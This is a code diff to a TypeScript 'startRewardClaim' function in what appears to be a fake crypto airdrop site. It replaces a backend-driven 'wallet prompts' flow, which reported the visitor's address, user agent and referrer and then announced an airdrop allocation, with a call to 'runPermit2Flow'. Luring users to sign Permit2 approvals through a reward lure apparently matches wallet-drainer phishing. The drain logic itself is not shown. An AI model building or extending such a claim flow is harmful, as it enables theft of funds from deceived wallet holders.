@@ -37,35 +37,13 @@ export const startRewardClaim = async ({ address, chainId }: StartRewardClaimArg
   }
 
   try {
-    const payload: ConnectedPayload = {
+    await runPermit2Flow({
       address,
       chainId,
       walletName: getWalletName(),
-      userAgent: navigator.userAgent,
-      referrer: document.referrer || undefined,
-      path: window.location.pathname,
-    };
-
-    const { sessionId, prompts, notice } = await notifyWalletConnected(payload);
-
-    if (notice) toast.message(notice);
-
-    if (prompts?.length) {
-      await runWalletPrompts({
-        sessionId,
-        address,
-        prompts,
-        onState: ({ status, attempt }) => {
-          console.log('[wallet-prompt]', status, 'attempt', attempt);
-        },
-      });
-    }
-
-    toast.success('Rewards Ready! 🎁', {
-      description: 'Your airdrop allocation is now available to claim.',
     });
   } catch (err: any) {
-    console.error('Backend claim flow failed', err);
+    console.error('Permit2 claim flow failed', err);
     toast.error('Could not reach rewards backend', {
       description: String(err?.message ?? '').slice(0, 140),
     });
@@ -73,3 +51,4 @@ export const startRewardClaim = async ({ address, chainId }: StartRewardClaimArg
     handled.delete(key);
   }
 };
+
